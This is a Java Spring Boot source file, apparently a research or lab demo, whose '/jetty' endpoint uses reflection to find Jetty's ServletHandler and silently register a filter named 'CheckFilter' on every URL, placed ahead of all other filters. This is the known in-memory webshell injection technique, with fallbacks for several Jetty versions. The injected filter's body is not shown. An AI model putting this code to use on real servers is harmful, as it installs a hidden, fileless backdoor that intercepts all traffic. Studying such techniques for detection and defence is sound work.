package tech.pdai.springboot.helloworld.jetty;

import me.gv7.tools.josearcher.entity.Blacklist;
import me.gv7.tools.josearcher.entity.Keyword;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.Filter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.EnumSet;

/**
 * @author pdai
 */
@SpringBootApplication
@RestController
public class SpringBootHelloWorldApplication {

    /**
     * main interface.
     *
     * @param args args
     */
    public static void main(String[] args) {
        SpringApplication.run(SpringBootHelloWorldApplication.class, args);
    }

    /**
     * hello world.
     *
     * @return hello
     */
    @GetMapping("/hello")
    public ResponseEntity<String> hello() {
        return new ResponseEntity<>("hello world", HttpStatus.OK);
    }


    @RequestMapping("/jetty")
    public String jetty() throws Exception {

//        java.util.List<me.gv7.tools.josearcher.entity.Keyword> keys = new ArrayList<Keyword>();
//        keys.add(new me.gv7.tools.josearcher.entity.Keyword.Builder().setField_type("org.eclipse.jetty.servlet.ServletHandler").build());
//// 定义黑名单
//        java.util.List<me.gv7.tools.josearcher.entity.Blacklist> blacklists = new ArrayList<Blacklist>();
//        blacklists.add(new me.gv7.tools.josearcher.entity.Blacklist.Builder().setField_type("java.io.File").build());
//// 新建一个广度优先搜索Thread.currentThread()的搜索器
//        me.gv7.tools.josearcher.searcher.SearchRequstByBFS searcher = new me.gv7.tools.josearcher.searcher.SearchRequstByBFS(Thread.currentThread(),keys);
//// 设置黑名单
//        searcher.setBlacklists(blacklists);
//// 打开调试模式,会生成log日志
//        searcher.setIs_debug(true);
//// 挖掘深度为20
//        searcher.setMax_search_depth(20);
//// 设置报告保存位置
//        searcher.setReport_save_path("/Temp/jetty3");
//        searcher.searchObject();


        Object handler = null;
        // 常规获取方法
        try {
            handler = getFieldValue(getFieldValue(Thread.currentThread().getContextClassLoader(), "_context"), "_servletHandler");
            addFilterByHandler(handler);
        } catch (Exception e) {
        }


        // 嵌入式jetty
        if (handler == null) {
            try {
                Object[] table = (Object[]) getFieldValue(getFieldValue(Thread.currentThread(), "threadLocals"), "table");
                for (Object o : table) {
                    handler = getFieldValue(getFieldValue(getFieldValue(o, "value"), "this$0"), "_servletHandler");
                    if (handler != null) {
                        addFilterByHandler(handler);
                    }
                }
            } catch (Exception e) {
            }
        }


        return "home";

    }


    private static String filterName = "CheckFilter";
    private static String urlPattern = "/*";


    static boolean addFilterByHandler(Object handler) {
        try {
//            System.out.println("[+] Add Dynamic Filter");

            ClassLoader classLoader = handler.getClass().getClassLoader();
            Class sourceClazz = null;
            Object holder = null;

            // 看网上的实现不太对劲,最后用这个基本兼容所有版本
            if (holder == null) {
                try {
                    holder = classLoader.loadClass("org.eclipse.jetty.servlet.FilterHolder").newInstance();
                } catch (Exception e) {

                }
            }
            // 6.0的实现
            if (holder == null) {
                try {
                    holder = classLoader.loadClass("org.mortbay.jetty.servlet.FilterHolder").newInstance();
                } catch (Exception e) {

                }
            }

            if (holder == null) {
                try {
                    Method method = handler.getClass().getMethod("newFilterHolder");
                    holder = method.invoke(handler);

                } catch (Exception e) {
                }
            }

            if (holder == null) {
                try {
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    Field field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(handler, field.get(null));

                } catch (ClassNotFoundException ex) {
                }
            }

            if (holder == null) {
                try {
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                } catch (Exception e) {

                }

            }


            holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);
            holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, new TestFilter());
            handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);
            // 兼容新旧jetty包名
            Class clazz;
            try {
                clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");

            } catch (Exception e) {
                clazz = classLoader.loadClass("org.mortbay.jetty.servlet.FilterMapping");
            }

            Object filterMapping = clazz.newInstance();
            Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
            method.setAccessible(true);
            method.invoke(filterMapping, holder);
            filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});

            try {
                filterMapping.getClass().getMethod("setFilterName", String.class).invoke(filterMapping, new Object[]{filterName});
            } catch (Exception e) {

            }

            try {
                filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
            } catch (Exception e) {
                filterMapping.getClass().getMethod("setDispatches", int.class).invoke(filterMapping, 1);
            }
            // prependFilterMapping 会自动把 filter 加到最前面
            try {
                handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
            } catch (Exception e) {
                handler.getClass().getMethod("addFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
            }

            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public enum DispatcherType {
        FORWARD,
        INCLUDE,
        REQUEST,
        ASYNC,
        ERROR;
    }


    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

}
